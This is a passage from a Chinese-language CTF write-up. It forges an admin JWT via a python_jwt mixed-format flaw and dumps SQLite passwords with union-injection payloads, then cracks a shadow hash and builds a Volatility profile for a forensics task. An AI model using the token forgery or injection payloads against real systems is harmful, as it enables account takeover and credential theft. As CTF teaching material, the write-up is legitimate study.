+                <span class="k">return</span> <span class="n">jwt</span><span class="o">.</span><span class="n">verify_jwt</span><span class="p">(</span><span class="n">topic</span><span class="p">,</span> <span class="n">generated_keys</span><span class="p">[</span><span class="s1">&#39;PS256&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;PS256&#39;</span><span class="p">])</span>
+
+            <span class="k">def</span> <span class="nf">token_should_not_verify</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">r</span><span class="p">):</span>
+                <span class="s2">&#34;&#34;&#34; Check the token doesn&#39;t verify due to mixed format being detected &#34;&#34;&#34;</span>
+                <span class="n">expect</span><span class="p">(</span><span class="n">r</span><span class="p">)</span><span class="o">.</span><span class="n">to_be_an_error</span><span class="p">()</span>
+                <span class="n">expect</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">))</span><span class="o">.</span><span class="n">to_equal</span><span class="p">(</span><span class="s1">&#39;invalid JWT format&#39;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>我们把我们的jwt搞上去，把is_admin换成1就ok了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">timedelta</span>
+<span class="kn">from</span> <span class="nn">json</span> <span class="kn">import</span> <span class="n">loads</span><span class="p">,</span> <span class="n">dumps</span>
+<span class="kn">import</span> <span class="nn">python_jwt</span> <span class="k">as</span> <span class="nn">jwt</span>
+<span class="kn">from</span> <span class="nn">jwcrypto.common</span> <span class="kn">import</span> <span class="n">base64url_decode</span><span class="p">,</span> <span class="n">base64url_encode</span>
+
+<span class="n">topic</span> <span class="o">=</span> <span class="s2">&#34;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcwOTkyNDUsImlhdCI6MTY2NzA5ODk0NSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiJteE9oWllCWTMwYW14bEhTUW4yczRRIiwibmJmIjoxNjY3MDk4OTQ1LCJwYXNzd29yZCI6ImEiLCJ1c2VybmFtZSI6ImEifQ.YL_7_6SwdxvUJm9W9WFRpKrITke0YfQlUDKDx06hifgVp0re7u5FUYSrChtN5trfVNzcWL-I9LNbtm_oLa3MUvxjbG6zJQSFMO6idOl3Wu5nZIRfNsg4RhNHrw4bZV9gf3D7Q4QsvCPcSDT9qXHjWnafZLAJ_y_Q8iZPAqbjaBV9FJ4vu3hjPH8vzN3d-v-39vqjVoQzSGJRz6dzQiBaZ8XGTD6qK8-AZ1xF-lEd02Lo1DD3MpJDUM7XXdPqC-tUnpIWYhaXI_1WNFbZWD6RunhdMJ_Ykt4u1GF7oYRBt12Q_uU106bSdosfPBQ-O2cfF8ewNe3K-RFKJtaVMUkt6A&#34;</span>
+<span class="p">[</span><span class="n">header</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">signature</span><span class="p">]</span> <span class="o">=</span> <span class="n">topic</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)</span>
+<span class="n">parsed_payload</span> <span class="o">=</span> <span class="n">loads</span><span class="p">(</span><span class="n">base64url_decode</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="n">parsed_payload</span><span class="p">[</span><span class="s1">&#39;is_admin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">parsed_payload</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2000000000</span>
+<span class="n">fake_payload</span> <span class="o">=</span> <span class="n">base64url_encode</span><span class="p">((</span><span class="n">dumps</span><span class="p">(</span><span class="n">parsed_payload</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;:&#39;</span><span class="p">))))</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;{&#34;  &#39;</span> <span class="o">+</span> <span class="n">header</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">fake_payload</span> <span class="o">+</span> <span class="s1">&#39;.&#34;:&#34;&#34;,&#34;protected&#34;:&#34;&#39;</span> <span class="o">+</span> <span class="n">header</span> <span class="o">+</span> <span class="s1">&#39;&#34;, &#34;payload&#34;:&#34;&#39;</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s1">&#39;&#34;,&#34;signature&#34;:&#34;&#39;</span> <span class="o">+</span> <span class="n">signature</span> <span class="o">+</span> <span class="s1">&#39;&#34;}&#39;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>下一步就是一个GraphQL注入，这个注入好像不算难，</p>
+<p>直接查询报错，提示getscoreusingid，但是只能是纯数字</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031112643966.png" title="image-20221031112643966" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031112643966.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031112643966.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031112643966.png, https://tuchuang.huamang.xyz/img/image-20221031112643966.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031112643966.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031112643966.png">
+    </a></p>
+<p>换成name试了一下，又报错发现这里有个getscoreusingnamehahaha</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031112728399.png" title="image-20221031112728399" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031112728399.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031112728399.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031112728399.png, https://tuchuang.huamang.xyz/img/image-20221031112728399.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031112728399.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031112728399.png">
+    </a></p>
+<p>然后就可以开始查询了</p>
+<p>查询版本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">1&#39;+union+select+sqlite_version()+—
+</code></pre></td></tr></table>
+</div>
+</div><p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031112822194.png" title="image-20221031112822194" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031112822194.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031112822194.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031112822194.png, https://tuchuang.huamang.xyz/img/image-20221031112822194.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031112822194.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031112822194.png">
+    </a></p>
+<p>爆出users表</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">1&#39;+union+select+(select+name+from+sqlite_master+where+type%3d&#39;table&#39;+limit+0,1)+—
+</code></pre></td></tr></table>
+</div>
+</div><p><a class="lightgallery" href="https://uploader.shimo.im/f/68HxBO3bcJjUMNNB.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c" title="img" data-thumbnail="https://uploader.shimo.im/f/68HxBO3bcJjUMNNB.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c">
+        <img
+            class="lazyload"
+            data-src="https://uploader.shimo.im/f/68HxBO3bcJjUMNNB.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c"
+            data-srcset="https://uploader.shimo.im/f/68HxBO3bcJjUMNNB.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c, https://uploader.shimo.im/f/68HxBO3bcJjUMNNB.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c 1.5x, https://uploader.shimo.im/f/68HxBO3bcJjUMNNB.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c 2x"
+            data-sizes="auto"
+            alt="https://uploader.shimo.im/f/68HxBO3bcJjUMNNB.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c">
+    </a>查出password<code>1'+union+select+(select+password+from+users)+—</code><a class="lightgallery" href="https://uploader.shimo.im/f/S2Y9fE1whe6cBXyv.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c" title="img" data-thumbnail="https://uploader.shimo.im/f/S2Y9fE1whe6cBXyv.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c">
+        <img
+            class="lazyload"
+            data-src="https://uploader.shimo.im/f/S2Y9fE1whe6cBXyv.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c"
+            data-srcset="https://uploader.shimo.im/f/S2Y9fE1whe6cBXyv.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c, https://uploader.shimo.im/f/S2Y9fE1whe6cBXyv.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c 1.5x, https://uploader.shimo.im/f/S2Y9fE1whe6cBXyv.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c 2x"
+            data-sizes="auto"
+            alt="https://uploader.shimo.im/f/S2Y9fE1whe6cBXyv.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c">
+    </a>登录获取flag <a class="lightgallery" href="https://uploader.shimo.im/f/RsRLRpWZH7RC2fsZ.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c" title="img" data-thumbnail="https://uploader.shimo.im/f/RsRLRpWZH7RC2fsZ.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c">
+        <img
+            class="lazyload"
+            data-src="https://uploader.shimo.im/f/RsRLRpWZH7RC2fsZ.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c"
+            data-srcset="https://uploader.shimo.im/f/RsRLRpWZH7RC2fsZ.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c, https://uploader.shimo.im/f/RsRLRpWZH7RC2fsZ.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c 1.5x, https://uploader.shimo.im/f/RsRLRpWZH7RC2fsZ.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c 2x"
+            data-sizes="auto"
+            alt="https://uploader.shimo.im/f/RsRLRpWZH7RC2fsZ.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c">
+    </a></p>
+<h1 id="misc" class="headerLink">
+    <a href="#misc" class="header-mark"></a>Misc</h1><h2 id="strange_forensics" class="headerLink">
+    <a href="#strange_forensics" class="header-mark"></a>strange_forensics</h2><p>autopsy取证题目说flag1是用户密码，这里得去找shadow，由于只能搜关键词，我就直接搜shadow的特征了<code>root:</code>确实搜得到</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122200427.png" title="image-20221031122200427" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122200427.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122200427.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122200427.png, https://tuchuang.huamang.xyz/img/image-20221031122200427.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122200427.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122200427.png">
+    </a></p>
+<p>但是其实很多还是passwd，继续往下翻翻到了</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122214695.png" title="image-20221031122214695" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122214695.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122214695.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122214695.png, https://tuchuang.huamang.xyz/img/image-20221031122214695.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122214695.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122214695.png">
+    </a></p>
+<p>有一个bob用户的密码，这里爆破一下就可以了<code>bob:$1$C5/bIl1n$9l5plqPKK4DjjqpGHz46Y/:19283:0:99999:7:::</code></p>
+<p>用hashcat爆了100万个爆破出来了</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122232269.png" title="image-20221031122232269" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122232269.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122232269.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122232269.png, https://tuchuang.huamang.xyz/img/image-20221031122232269.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122232269.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122232269.png">
+    </a></p>
+<p>keyword扫描直接扫描出了flag3的明文<code>Ux_forEnsIcs_MASTER</code></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122248044.png" title="image-20221031122248044" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122248044.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122248044.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122248044.png, https://tuchuang.huamang.xyz/img/image-20221031122248044.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122248044.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122248044.png">
+    </a></p>
+<p>现在就差flag2了autopsy好像没搜到什么</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122259487.png" title="image-20221031122259487" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122259487.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122259487.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122259487.png, https://tuchuang.huamang.xyz/img/image-20221031122259487.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122259487.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122259487.png">
+    </a></p>
+<p>strings搜了一下敏感的关键字，发现这里是有个secret.zip，而且刚好在我们刚刚获取的用户密码bob的桌面上</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122311749.png" title="image-20221031122311749" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122311749.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122311749.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122311749.png, https://tuchuang.huamang.xyz/img/image-20221031122311749.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122311749.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122311749.png">
+    </a></p>
+<p>要dump文件出来，那就只能vol了，vol要dump出linux的东西，大概率扫不出imageinfo，所以得去自己找找系统搜了一下关键词，18.04</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122329481.png" title="image-20221031122329481" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122329481.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122329481.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122329481.png, https://tuchuang.huamang.xyz/img/image-20221031122329481.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122329481.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122329481.png">
+    </a></p>
+<p>找到了kernel版本号：<code>Linux version 5.4.0-84-generic (buildd@lcy01-amd64-007)</code></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122346792.png" title="image-20221031122346792" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122346792.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122346792.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122346792.png, https://tuchuang.huamang.xyz/img/image-20221031122346792.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122346792.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122346792.png">
+    </a></p>
+<p>现在系统就找到了，<code>Ubuntu18.04.5 5.4.0-84-generic</code>然后就是去做一个同版本Ubuntu的虚拟机了，这里更换内核版本</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122402271.png" title="image-20221031122402271" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122402271.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122402271.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122402271.png, https://tuchuang.huamang.xyz/img/image-20221031122402271.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122402271.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122402271.png">
+    </a></p>
+<p>搭建好相同环境的Ubuntu</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122418282.png" title="image-20221031122418282" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122418282.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122418282.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122418282.png, https://tuchuang.huamang.xyz/img/image-20221031122418282.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122418282.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122418282.png">
+    </a></p>
+<p>然后就开始制作profile</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122432394.png" title="image-20221031122432394" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122432394.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122432394.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122432394.png, https://tuchuang.huamang.xyz/img/image-20221031122432394.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122432394.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122432394.png">
+    </a></p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122443065.png" title="image-20221031122443065" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122443065.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221031122443065.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221031122443065.png, https://tuchuang.huamang.xyz/img/image-20221031122443065.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221031122443065.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221031122443065.png">
+    </a></p>
+<p>然后拉进我们的vol就可以了</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221031122455645.png" title="image-20221031122455645" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221031122455645.png">
+        <img
+            class="lazyload"
